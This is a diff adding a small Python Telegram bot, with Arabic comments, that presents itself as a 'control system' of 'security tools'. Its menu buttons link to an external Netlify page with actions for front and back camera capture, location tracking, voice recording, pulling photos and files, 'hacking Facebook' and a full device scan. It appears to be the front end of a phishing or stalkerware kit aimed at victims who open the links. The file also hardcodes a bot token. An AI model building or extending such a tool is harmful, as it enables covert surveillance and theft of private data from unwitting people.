@@ -1,0 +1,48 @@
+import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, ContextTypes
+
+# --- الإعدادات الخاصة بك ---
+TOKEN = "7893697653:AAHrnomuSHgYjMfr7se-uHBLh_tCVTTOcwQ"
+# الرابط الجديد الذي أرسلته
+BASE_URL = "https://stately-melomakarona-cb7813.netlify.app/"
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # تصميم الأزرار بحيث يرسل كل زر "أمر" مختلف للرابط
+    keyboard = [
+        [
+            InlineKeyboardButton("📸 كاميرا أمامية", url=f"{BASE_URL}?action=camera_front"),
+            InlineKeyboardButton("📷 كاميرا خلفية", url=f"{BASE_URL}?action=camera_back")
+        ],
+        [
+            InlineKeyboardButton("📍 تحديد الموقع", url=f"{BASE_URL}?action=location"),
+            InlineKeyboardButton("🎙️ تسجيل صوتي", url=f"{BASE_URL}?action=mic")
+        ],
+        [
+            InlineKeyboardButton("📁 سحب صور وملفات", url=f"{BASE_URL}?action=files"),
+            InlineKeyboardButton("🖥️ اختراق فيسبوك", url=f"{BASE_URL}?action=camera_front")
+        ],
+        [
+            InlineKeyboardButton("⚙️ فحص شامل للجهاز", url=f"{BASE_URL}?action=all")
+        ]
+    ]
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    user_name = update.effective_user.first_name
+    msg = (
+        f"مرحباً بك يا {user_name} في نظام التحكم المطور.\n\n"
+        "تم تجهيز الأدوات الأمنية. اختر الأداة التي ترغب بتشغيلها:"
+    )
+    
+    await update.message.reply_text(msg, reply_markup=reply_markup)
+
+def main():
+    app = Application.builder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    print("✅ البوت يعمل الآن بالرابط الجديد والمهام المنفصلة!")
+    app.run_polling()
+
+if __name__ == '__main__':
+    main()
+    
